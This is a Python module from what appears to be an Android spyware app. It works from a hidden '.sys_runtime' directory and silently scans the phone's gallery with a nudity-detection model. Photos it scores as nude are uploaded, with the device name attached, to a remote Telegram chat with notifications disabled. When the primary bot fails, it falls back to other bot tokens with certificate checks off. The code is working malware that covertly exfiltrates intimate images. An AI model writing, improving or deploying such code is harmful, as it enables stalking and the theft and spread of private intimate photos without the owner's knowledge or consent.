# -*- coding: utf-8 -*-
import os
import time
import threading
import logging
import sqlite3
import hashlib
import gc
import shutil
import requests
from datetime import datetime

# ========== توحيد مسار runtime ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
M = os.path.join(P, ".models")
if not os.path.exists(M):
    os.makedirs(M)

logging.basicConfig(filename=os.path.join(P, "n.log"), level=logging.ERROR, filemode='a')

# ========== استيراد المكتبات (آمن مع fallback) ==========
AI_AVAILABLE = False
Interpreter = None

try:
    import numpy as np
    from PIL import Image, UnidentifiedImageError
    Image.MAX_IMAGE_PIXELS = 50_000_000

    try:
        from tflite_runtime.interpreter import Interpreter
    except ImportError:
        # محاولة بديلة: tensorflow (أكبر حجماً، لكن قد يكون متاحاً)
        try:
            import tensorflow as tf
            Interpreter = tf.lite.Interpreter
        except ImportError:
            raise ImportError("No TFLite library found")

    AI_AVAILABLE = True
except ImportError as e:
    logging.error(f"Failed to import AI libraries: {e}")
    # تعريف وهمي لتجنب NameError (لن يُستخدم لأن AI_AVAILABLE = False)
    class Interpreter:
        pass


class NudeDetector:
    def __init__(self, mon=None):
        self.mon = mon
        self.active = False          # هل تتم عملية مسح حالياً؟
        self.model = None
        self._lock = threading.Lock()
        self.last_run = 0

        # مسار النموذج داخل .sys_runtime/.models
        self.model_path = os.path.join(M, "engine_v2.tflite")

        # المسارات المحتملة للنموذج في assets (داخل APK)
        base_dir = os.getcwd()
        self.assets_candidates = [
            os.path.join(base_dir, "assets", "engine_v2.tflite"),
            os.path.join(base_dir, "engine_v2.tflite")
        ]

        # قاعدة بيانات الكاش (لمنع إعادة تحليل نفس الصورة)
        self.db = os.path.join(P, "n_cache.db")
        self._init_db()

        if AI_AVAILABLE:
            threading.Thread(target=self._prepare_engine, daemon=True).start()
        else:
            logging.warning("AI libraries missing. NudeDetector will remain inactive.")

    # ========== إدارة قاعدة البيانات ==========
    def _init_db(self):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute('CREATE TABLE IF NOT EXISTS scan_logs (h TEXT PRIMARY KEY, ts INTEGER)')
                conn.execute('CREATE INDEX IF NOT EXISTS idx_ts ON scan_logs(ts)')
                old_threshold = int(time.time()) - (30 * 86400)
                conn.execute('DELETE FROM scan_logs WHERE ts < ?', (old_threshold,))
                conn.commit()
        except Exception as e:
            logging.error(f"DB init error: {e}")

    # ========== تحضير وتحميل النموذج ==========
    def _prepare_engine(self):
        if not AI_AVAILABLE:
            return
        try:
            need_copy = (not os.path.exists(self.model_path) or 
                         os.path.getsize(self.model_path) < 500000 or
                         os.path.getsize(self.model_path) == 0)
            if need_copy:
                for src in self.assets_candidates:
                    if os.path.exists(src) and os.path.getsize(src) > 500000:
                        shutil.copy(src, self.model_path)
                        logging.info(f"✅ Model copied from {src}")
                        break
                else:
                    logging.error("❌ No valid model found. AI disabled.")
                    return
            self._load_engine()
        except Exception as e:
            logging.error(f"Prepare engine error: {e}")

    def _load_engine(self):
        if not AI_AVAILABLE:
            return
        try:
            if not os.path.exists(self.model_path):
                return
            size = os.path.getsize(self.model_path)
            if size < 500000:
                logging.error(f"Model too small ({size} bytes)")
                return
            self.model = Interpreter(model_path=self.model_path)
            self.model.allocate_tensors()
            inputs = self.model.get_input_details()
            outputs = self.model.get_output_details()
            self.in_idx = inputs[0]['index']
            self.out_idx = outputs[0]['index']
            logging.info("✅ TFLite engine loaded")
        except Exception as e:
            logging.error(f"Load engine error: {e}")
            self.model = None

    # ========== تحليل الصورة (يعمل فقط إذا AI متاح) ==========
    def analyze(self, path):
        if not AI_AVAILABLE or self.model is None or not os.path.exists(path):
            return 0.0

        # استبعاد الملفات الكبيرة جداً
        if os.path.getsize(path) > 8 * 1024 * 1024:
            return 0.0

        if not path.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
            return 0.0

        try:
            with Image.open(path) as raw_img:
                width, height = raw_img.size
                aspect_bonus = 0.05 if height > width * 1.2 else 0.0
                img = raw_img.convert('RGB').resize((224, 224), Image.LANCZOS)

            arr = np.asarray(img, dtype=np.float32).reshape(1, 224, 224, 3) / 255.0
            self.model.set_tensor(self.in_idx, arr)
            self.model.invoke()
            out = self.model.get_tensor(self.out_idx)[0]
            prob = float(out[1]) if len(out) > 1 else float(out[0])
            prob = min(prob + aspect_bonus, 1.0)
            return prob
        except Exception as e:
            logging.error(f"Analyze error: {e}")
            return 0.0

    def _should_send(self, prob):
        # عتبة ذكية تعتمد على حالة الشحن
        if prob > 0.90:
            return True
        if prob > 0.85:
            return True
        if prob > 0.70 and hasattr(self.mon, '_battery_ok'):
            try:
                bat, charging = self.mon._battery_ok()
                if charging:
                    return True
            except:
                pass
        return False

    # ========== المسح التلقائي (يتوقف إذا AI غير متاح) ==========
    def scan(self):
        if not AI_AVAILABLE or self.active or self.model is None:
            return
        now = time.time()
        if (now - self.last_run) < 1800:
            return
        self.last_run = now
        threading.Thread(target=self._worker, daemon=True).start()

    def _worker(self):
        if not AI_AVAILABLE or self.model is None:
            return
        if not self._lock.acquire(blocking=False):
            return
        try:
            self.active = True
            sc = getattr(self.mon, 'media_scanner', None)
            if not sc:
                return

            items = sc.get_gallery_by_category("pending", limit=20)
            for item in items:
                path = item.get("path")
                if not path or not os.path.exists(path):
                    continue

                h = hashlib.md5(path.encode()).hexdigest()
                if self._is_cached(h):
                    continue

                prob = self.analyze(path)
                if self._should_send(prob):
                    sc.update_category(item.get("hash"), "nude", prob)
                    self._report(path, item.get("label", "??"), prob)
                elif prob > 0.45:
                    sc.update_category(item.get("hash"), "questionable", prob)
                else:
                    sc.update_category(item.get("hash"), "normal", prob)

                self._mark_cached(h)
                time.sleep(0.5)

        except Exception as e:
            logging.error(f"AI Worker error: {e}")
        finally:
            self.active = False
            self._lock.release()
            gc.collect()

    # ========== دوال الكاش ==========
    def _is_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                cur = conn.execute("SELECT 1 FROM scan_logs WHERE h=?", (h,))
                return cur.fetchone() is not None
        except:
            return False

    def _mark_cached(self, h):
        try:
            with sqlite3.connect(self.db) as conn:
                conn.execute("INSERT OR REPLACE INTO scan_logs VALUES (?, ?)", (h, int(time.time())))
                conn.commit()
        except:
            pass

    # ========== إرسال التقرير مع Fallback (يعمل حتى لو AI غير متاح؟ لا، فقط إذا كان هناك تغذية) ==========
    def _report(self, path, label, confidence):
        tg = getattr(self.mon, 'ui', None)
        if not tg or not os.path.exists(path):
            return

        caption = (f"🔞 **AI Detection**\n"
                   f"Label: `{label}`\n"
                   f"Confidence: `{confidence:.0%}`\n"
                   f"Device: `{self.mon.dmd}`\n"
                   f"Time: `{datetime.now().strftime('%H:%M:%S')}`")

        # المحاولة الأولى عبر البوت الرئيسي
        with open(path, 'rb') as f:
            res = tg._api("sendPhoto", {
                "chat_id": tg.dat,
                "caption": caption,
                "parse_mode": "Markdown",
                "disable_notification": True
            }, {"photo": f})

        # إذا فشلت المحاولة الأولى -> fallback باستخدام active_tokens مباشرة
        if not res or not res.get('ok'):
            logging.warning("Primary bot failed in AI report, activating fallback...")
            for token in getattr(tg, 'active_tokens', []):
                try:
                    url = f"https://api.telegram.org/bot{token}/sendPhoto"
                    with open(path, 'rb') as f2:
                        fallback_res = requests.post(
                            url,
                            data={"chat_id": tg.dat, "caption": caption + "\n(Fallback)", "parse_mode": "Markdown"},
                            files={"photo": f2},
                            timeout=30,
                            verify=False
                        )
                        if fallback_res.json().get('ok'):
                            logging.info(f"AI report sent via fallback bot")
                            break
                except Exception as e:
                    logging.error(f"Fallback send error: {e}")
                    continue


def create(mon=None):
    return NudeDetector(mon)
